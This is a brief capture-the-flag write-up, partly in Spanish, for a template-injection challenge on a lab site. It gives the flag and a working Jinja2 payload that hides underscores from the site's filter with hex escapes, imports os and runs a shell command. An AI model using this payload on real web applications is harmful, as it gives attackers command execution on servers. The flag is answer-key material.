## Descripción 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://chatelaine.cylabacademy.net:37618/)!
## Solución 
academy{sst1_f1lt3r_byp4ss_7d09ff8d}
## Notas adicionales 
use los mismo pasos que en el ssti 1 y me dio la flag pero use {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
## Referencias